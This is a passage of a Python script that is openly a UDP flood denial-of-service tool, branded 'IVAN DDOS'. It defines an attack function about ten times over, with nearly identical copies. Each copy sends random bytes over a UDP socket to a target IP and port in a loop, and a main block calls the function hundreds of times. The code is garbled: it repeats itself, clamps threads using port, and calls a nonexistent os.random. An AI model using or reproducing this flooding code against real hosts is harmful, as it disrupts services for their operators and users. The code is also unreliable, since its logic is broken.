        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

if __name__ == '__main__':
    try:
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')